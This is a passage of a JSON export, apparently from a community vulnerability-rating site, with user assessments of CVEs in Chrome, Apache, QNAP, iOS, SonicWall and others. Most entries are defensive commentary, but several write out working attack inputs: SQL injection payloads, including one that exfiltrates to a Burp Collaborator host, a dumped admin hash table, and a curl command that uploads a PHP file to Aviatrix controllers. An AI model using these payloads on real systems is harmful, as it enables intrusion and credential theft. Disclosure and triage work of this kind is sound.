          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "420dfe3a-1bd8-4646-b210-8f2bf2473dc6",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "064ecb42-df1b-4a9e-ba5d-0e028e4029d0",
      "created": "2021-09-30T14:17:02.551666Z",
      "revisionDate": "2021-09-30T14:17:02.550572Z",
      "document": "A complete root cause analysis could be found at: https://voidsec.com/fuzzing-faststone-image-viewer-cve-2021-26236/",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "364ce24b-30e4-4643-9118-3312e2d1a5b0",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "11c68cbe-5057-47c9-9102-13e9c7cd1260",
      "created": "2021-09-30T14:22:02.177184Z",
      "revisionDate": "2021-09-30T22:24:08.20824Z",
      "document": "Crucial by Micron Technology, Inc **Ballistix MOD Utility** v.<= 2.0.2.5 is vulnerable to **multiple Privilege Escalation** (LPE/EoP) vulnerabilities in the `MODAPI.sys` driver component.\r\n\r\nAll the vulnerabilities are triggered by sending specific IOCTL requests and will allow to:\r\n- Directly interact with physical memory via the `MmMapIoSpace` function call, mapping physical memory into a virtual address user-space.\r\n- Read/write Model-Specific Registers (MSRs) via the `__readmsr/__writemsr` functions calls.\r\n- Read/write 1/2/4 bytes to or from an IO port.\r\n\r\nAttackers could exploit these issues to achieve local privilege escalation from low-privileged users to `NT AUTHORITY\\SYSTEM`.\r\nA complete analysis could be found at: https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "c66024ac-7baf-4987-85ad-ce24479ada2e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "d35b77a1-b787-4dad-a906-5ca8a79c2f30",
      "created": "2021-10-02T19:27:25.202858Z",
      "revisionDate": "2021-10-02T19:28:46.199878Z",
      "document": "More info will be available at https://bugs.chromium.org/p/chromium/issues/detail?id=1251787 when this bug gets declassified however for now https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_30.html indicates that this is a Medium severity bug caused by an information leak within Core itself. It was discovered by Cl\u00e9ment Lecigne from Google TAG, with technical assistance from Sergei Glazunov and Mark Brand from Google Project Zero and was first discovered on 2021-09-21.\r\n\r\nThe fact that Google TAG discovered this combined with the fact this was exploited in the wild means that its likely Google found this exploit via in the wild exploitation and TAG noticed these exploitation attempts, verified it was a 0day vulnerability, and then notified Google so that they could issue a fix. What is interesting though is that there is no mention of a related 0day exploit that was combined with this vulnerability, which I imagine would be needed in order to make a full exploit.\r\n\r\nMost likely this vulnerability would be used to leak information needed for form a full exploit, and would likely be useful for bypassing certain security mitigations that may otherwise prevent the exploit from working normally.\r\n\r\nOn its own this vulnerability is therefore of Medium to Medium-Low severity, however given its use in exploits in the wild I'd recommend still patching this to make sure that you are protecting your organization against threats that have been proven to have been successfully exploited in real world scenarios. Just be aware that this might sit lower on your priority list than vulnerabilities that can get RCE on their own.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "a1a1d722-d1a4-4a27-9f0d-02f4fb8f3883",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "d986b627-da84-4c1b-8d20-5adf751b05bf",
      "created": "2021-10-02T19:38:26.719061Z",
      "revisionDate": "2021-10-02T19:39:45.072052Z",
      "document": "Exploitation in the wild of this bug has been noted as reported by Google at https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_30.html. The bug details are available at https://bugs.chromium.org/p/chromium/issues/detail?id=1252918 but are still classified to the public until more people have patched.\r\n\r\nThe bug in question is a Use-After-Free vulnerability in the V8 JavaScript rendering engine of Google Chrome prior to 94.0.4606.71.  It was reported by an anonymous user on 2021-09-24. Use-After-Free vulnerabilities in V8 are not all that uncommon and are frequently used in the wild to attack Chrome users, as was observed with this particular bug. They often give an attacker access to the user's desktop considering that the V8 engine is not sandboxed, although according to https://www.zdnet.com/article/bugs-in-chromes-javascript-engine-can-lead-to-powerful-exploits-this-project-aims-to-stop-them/, there are plans by Google to potentially look at sandboxing the V8 engine in the future.\r\n\r\nAll in all given the severity of this bug, the lack of sandboxing of the V8 engine, the history of exploitation of V8 bugs in the past giving a rich knowledge base for attackers to work from, and the fact that this bug has been exploited in the wild already, I would highly recommend patching this bug as soon as possible.\r\n\r\nIf this is not possible then JavaScript should be disabled on all untrusted sites using a plugin such as NoScript or by disabling JavaScript execution within the settings of Chrome itself to avoid exposing oneself to this vulnerability until patches can be deployed.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ec90f2c8-6a94-4e70-93a1-cc7bac421887",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "97458e28-c71c-4236-91b8-45067daf57e9",
      "created": "2021-10-04T18:46:34.198043Z",
      "revisionDate": "2021-10-04T18:59:27.277653Z",
      "document": "## [fool-CVE-nu11-100421](https://www.sourcecodester.com/php/14973/local-offices-contact-directory-site-using-php-and-sqlite-free-source-code.html)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/fool-CVE-nu11-100421/docs/Screenshot%202021-10-04%20204344.png)\r\n\r\n## Vendor:\r\n[href](https://www.sourcecodester.com/php/14973/local-offices-contact-directory-site-using-php-and-sqlite-free-source-code.html)\r\n\r\n## Description:\r\nThe `search` parameter appears to be vulnerable to time-based blind SQL injection attacks, on the web app \"Local Offices Contact Directories Site\" (by oretnom23). \r\nThe malicious attacker can execute a malicious payload and he can dump hashes authentication credentials. Then the attacker can to\r\ntake control of the admin account of the system and can steal sensitive information and can destroy the system administrative account.\r\n\r\n\r\n## Payload:\r\n```sql\r\n---\r\nParameter: search (GET)\r\n    Type: time-based blind\r\n    Title: SQLite > 2.0 AND time-based blind (heavy query)\r\n    Payload: search=481614'||(SELECT CHAR(79,85,82,97) WHERE 8245=8245 AND 4378=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'\r\n---\r\n```\r\n- dump\r\n\r\n```sql\r\nTable: admin_list\r\n[2 entries]\r\n+----------+----------------------------------+\r\n| username | password                         |\r\n+----------+----------------------------------+\r\n| admin    | 0192023a7bbd73250516f069df18b500 |\r\n| cblake   | cd74fae0a3adf459f73bbf187607ccea |\r\n+----------+----------------------------------+\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/fool-CVE-nu11-100421)\r\n\r\n## Proof:\r\n[href](https://streamable.com/zmm464)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0a9a2304-fcb9-4925-a9bd-6e9747fe06c6",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "4bb9d3c7-37ef-4b65-b2a8-550afc30664c",
      "created": "2021-10-05T15:29:58.172772Z",
      "revisionDate": "2021-10-13T08:28:27.400037Z",
      "document": "Apache doesn't typically run with root privileges in most environments so the value of this vulnerability will largely be in using it to leak application-specific secrets such as signing keys, database connection strings, source code etc. Path traversal vulnerabilities are among the easiest to exploit and involve no type of corruption, making them very reliable and safe to use multiple times.\r\n\r\nThere will likely be evidence within the Apache access logs of exploitation. Filtering on the HTTP status code could also provide insight into what files the attacker was able to successfully leak.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "73edf636-57df-4b24-b927-1e941357d6da",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "97458e28-c71c-4236-91b8-45067daf57e9",
      "created": "2021-10-05T18:44:44.266021Z",
      "revisionDate": "2021-10-06T06:07:42.902911Z",
      "document": "There are ~65K fingerprintable versions of these in the wild\r\n\r\n![](https://drive.google.com/uc?export=view&id=1q83k7iH7LK2AUKC1rjeN0r6IxCEif6R5)",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3b51b211-83b4-4490-a085-f721c50c0f8a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "df0fdfd8-0658-486f-9546-1ffb8886a24f",
      "created": "2021-10-06T08:38:55.507994Z",
      "revisionDate": "2021-10-07T20:14:58.994573Z",
      "document": "## [CVE-2021-41647](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41647)\r\n![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-41647/docs/Screenshot%202021-10-06%20110714.png)\r\n\r\n## Description:\r\nAn un-authenticated error-based and time-based blind SQL injection vulnerability exists in Kaushik Jadhav Online Food Ordering Web App 1.0. An attacker can exploit the vulnerable \"username\" parameter in login.php and retrieve sensitive database information, as well as add an administrative user.\r\n\r\n## SQL Request:\r\n\r\n```sql\r\nPOST /Online-Food-Ordering-Web-App-master/account/routers/register-router.php HTTP/1.1\r\nHost: 192.168.1.180\r\nOrigin: http://192.168.1.180\r\nCookie: PHPSESSID=l9r6fsvj0k8ebeb4kn6qb4acee\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/Online-Food-Ordering-Web-App-master/account/register.php\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 68\r\n\r\nusername=eRmmfIOD&name=THWdzbPo'%2b(select%20load_file('%5c%5c%5c%5c6z6ghxyoj1qsw3gtl0e0hf0sljrcf3ar1upmcd02.burpcollaborator.net%5c%5cjuf'))%2b'&password=b5R%21c5j%21G5&phone=476835\r\n```\r\n## SQL Response:\r\n\r\n```sql\r\nHTTP/1.1 200 OK\r\nDate: Wed, 06 Oct 2021 07:10:35 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 3775\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1.0,\r\n...[SNIP]...\r\n```\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41647)\r\n\r\n## Proof:\r\n[href](https://streamable.com/6od1m2)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8e4eea75-0c9d-4d92-b674-23677c588d9f",
      "editorId": "9cf8a01b-7088-456a-accb-96ffdfc3b6a8",
      "topicId": "97458e28-c71c-4236-91b8-45067daf57e9",
      "created": "2021-10-06T09:58:30.11736Z",
      "revisionDate": "2021-10-06T09:58:30.116796Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "086d6981-f169-4678-8923-2840779a2a4b",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "ae858891-31a7-4db1-b1a8-15cb839e5280",
      "created": "2021-10-08T07:43:28.28727Z",
      "revisionDate": "2021-10-09T17:39:46.36024Z",
      "document": "## [CVE-2021-41878](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41878)\r\n![logo](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41878/docs/Screenshot%202021-10-08%20103101.png)\r\n\r\n## Description:\r\nA reflected cross-site scripting (XSS) vulnerability exists in the i-Panel Administration System Version 2.0 that enables a remote attacker to execute arbitrary JavaScript code in the browser-based web console and it is possible to insert a vulnerable malicious button.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41878)\r\n\r\n## More:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-41878.html)\r\n\r\n## Proof:\r\n[href](https://streamable.com/abz36l)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "04ccf5a7-a09b-495a-b63c-4ad7ab68ab48",
      "editorId": "4790784d-d558-4c38-8d39-7491527ea4c1",
      "topicId": "278e639d-2084-4cd6-8d70-728940e8656d",
      "created": "2021-10-08T09:33:26.899818Z",
      "revisionDate": "2021-10-08T09:33:26.899883Z",
      "document": "Just login and modify the value of cookie then refresh(F5).\r\nurl: /user/daohang_company.php\r\nCookie:{\"Password\",\"e10adc3949ba59abbe56e057f20f883e' && if(1=1,sleep(5),0)--+\"}\r\n//e10adc3949ba59abbe56e057f20f883e is the Original cookie after login, don't change it. \r\n\r\nhttps://github.com/Pandora1m2/zzcms201910/issues/1",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "970a9fa9-223d-4d07-bafa-a338147934f3",
      "editorId": "763c8c3c-8492-4c31-9256-d2738dee19fd",
      "topicId": "e355ab47-21a0-4270-b1b7-31327c5db3e0",
      "created": "2021-10-09T06:33:05.507591Z",
      "revisionDate": "2021-10-09T14:37:34.6929Z",
      "document": "### Description \r\nThis Vulnerability allows an attacker to create and store file on the Aviatrix controller. Exploitation phase doesn't need any user authentication , or doesn't require any other users interaction , simply can be exploited using curl . Here is one example.\r\n```bash\r\ncurl -k https://aviatrix.domain.tld/v1/backend1 -d CID=x -d action=set_metric_gw_selections -d account_name=/../../../var/www/php/poc.php -d 'data=hello<?php echo \"Vulnerable Poc\";?>'\r\n\r\n# after executing the previous command if the target is vulnerable this will create a php file on this path\r\n\r\nhttps://vulnerable.target.com/v1/poc \r\n``` \r\nAttacker can do this unauthenticated because many API calls do not enforce a check for authentication. So this allows an unauthenticated attacker to upload arbitrary files, including .php scripts, to the filesystem .   \r\n\r\nOr You can Use This Exploit to do the exploition more easily : https://github.com/JoyGhoshs/CVE-2021-40870\r\n\r\n![Exploitation](https://i.ibb.co/2vwq3TS/Screenshot-20211009-123757.png)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3a34ba5c-5855-490b-91e0-723222f6c3b6",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "f5afc420-0b89-47f3-b0b5-53e402b6f49d",
      "created": "2021-10-11T12:42:15.578557Z",
      "revisionDate": "2021-10-11T13:38:07.322319Z",
      "document": "This is another of those products I hadn't ever heard of before we started hearing about compromises. There's a Metasploit module available here, hence the relatively high exploitability rating: https://github.com/rapid7/metasploit-framework/pull/15525\r\n\r\nMitigation is to lock down admin access, sensibly: https://dev.lucee.org/t/lucee-vulnerability-alert-november-2020-cve-2021-21307/7643",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3d27091e-b3c7-4849-a16a-de15fa74e83b",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "7878b56a-00db-4e50-8953-01b40fc32071",
      "created": "2021-10-11T14:52:22.888454Z",
      "revisionDate": "2021-10-11T21:34:11.333046Z",
      "document": "Both [Palo Alto Networks](https://unit42.paloaltonetworks.com/ech0raix-ransomware-soho/) and [Netlab360](https://blog.netlab.360.com/in-the-wild-qnap-nas-attacks-en/) (ostensibly, since Netlab360 doesn't specify any CVEs) have write-ups on widespread attacks leveraging this bug starting in April and going through at least August, including ransomware campaigns. QNAP's [advisory](https://www.qnap.com/en-us/security-advisory/qsa-21-13) is pretty sparse, but from the [news coverage](https://www.bleepingcomputer.com/news/security/qnap-removes-backdoor-account-in-nas-backup-disaster-recovery-app/) it sounds like this was a hard-coded creds bug that allowed an attacker to log into a vulnerable device (which evidently QLocker and ech0raix ransomware operators did). Yikes\u2014hopefully folks have patched by now. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "6d3e7b05-a655-40ac-ac13-10e7069cf79e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "1fac9eab-6c14-40a6-94ca-04062f93d773",
      "created": "2021-10-12T15:36:14.309069Z",
      "revisionDate": "2021-10-12T15:37:30.673832Z",
      "document": "Public analysis of this vulnerability is available along with an initial PoC at https://saaramar.github.io/IOMFB_integer_overflow_poc/. The bug appears to be a bug in IOMobileFrameBuffer/AppleCLCD which was exploited in the wild. This attack surface is accessible from sandboxes which means that it was likely combined with another vulnerability such as a WebKit vulnerability in the wild to form a complete chain and gain kernel level access. However no information is available from what I can tell on what other vulnerability might have been used in the in the wild exploit chain.\r\n\r\nTo be more specific the patch appears to affect `IOMFB::TableCompensator::BilerpGainTable::new_from_data()` and some related `new_from_data` type functions that attempt to allocate a buffer that is used to store table content sent by the user. However most of the operands are fully controlled by the user and the calculation of the buffer size is done in 32 bit not in 64 bits so it is easy to overflow or underflow the buffer size calculation.\r\n\r\nSpecifically the vulnerable line within the `IOMFB::TableCompensator::BilerpGainTable::new_from_data()` function was `v_chunk = kalloc_ext((unsigned int)(12 * v15 * v14 + 4 * (v14 + a3)));` which appears to be casting a result to a unsigned 32 bit integer, when the variable `v14` is of size `int64`, `v15` is a `int` that is directly controlled by the attacker, and `a3` is another `int` also controlled by the attacker. By passing this line certain sizes an attacker could cause `kalloc_ext` to allocate a undersized buffer which can then be overflowed when data is later copied to it, resulting in a heap overflow in the iOS kernel, which if successfully exploited, would grant the attacker kernel level privileges.\r\n\r\nWhilst there is no full exploit out right now, the common opinion in the community is given the evidence of exploitation in the wild and the fact that an existing PoC already exists, it is likely just a matter of time and researcher's efforts before this vulnerability is made into a public working exploit by some developer. Definitely patch this one if your organization runs iOS devices or if jailbroken iPhones are a concern to your organization, though realize it will likely take some time before a fully working exploit is released to the public.\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "dfd55ec4-c900-4175-9356-5422135487f5",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "3c46076b-baa2-4e8a-9be1-5173e1828e48",
      "created": "2021-10-12T20:21:56.413444Z",
      "revisionDate": "2021-10-12T20:28:39.294683Z",
      "document": "Beyond denial of service purposes, CVE-2021-20034 has limited attacker value due to the inability of the attacker to easily reboot the system post-exploitation. While the vulnerability could see use by destructive attackers, it's unlikely to be used in any type of widespread campaign like previous SonicWall vulnerabilities. See the Rapid7 analysis for full details.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "d6292af3-5b62-4b31-9556-bf0129525245",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "33cca39f-adb3-4a25-af6b-d07c441665be",
      "created": "2021-10-13T08:48:07.093263Z",
      "revisionDate": "2021-10-13T10:09:27.295131Z",
